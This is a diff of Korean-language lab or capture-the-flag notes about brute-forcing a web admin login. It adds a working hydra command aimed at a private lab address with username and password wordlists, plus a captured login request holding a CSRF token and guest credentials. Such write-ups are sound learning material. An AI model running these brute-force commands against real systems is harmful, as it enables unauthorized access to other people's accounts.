@@ -42,6 +42,9 @@
 - 로그인 과정에서 오고가는 패킷 중 보내는 패킷에 대한 내용이다.
 - 웹 페이지의 관리자 권한으로 로그인할 수 있는 방법으로 보내는 패킷을 변조하는 것이 가능할 것 같다.
 # \[브루트 포스 공격]
+## `hydra 192.168.56.112 -s 8080 http-form-post "/:username=^USER^&password=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`
+- 웹 페이지 관리자 권한으로 로그인할 수 있는 계정을 알아내기 위해 무차별 대입 공격을 진행
 - `weakuser.txt` 파일 생성
 - guest, venus, magellan 추가 저장
-`hydra 192.168.56.112 -s 8080 http-form-post "/:username=^USER^&password=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`
+![[Pasted image 20240930163719.png]]
+`"/:csrfmiddlewaretoken=fxXgR9ODXvujCbtePqtUWig2kHKn9VXfe239wRefjDSPESfwdyRdljyvEMkq2mEa&username=guest&password=guest&next=%2Fadmin%2Flost%2Bfound:Server Error (500)"`
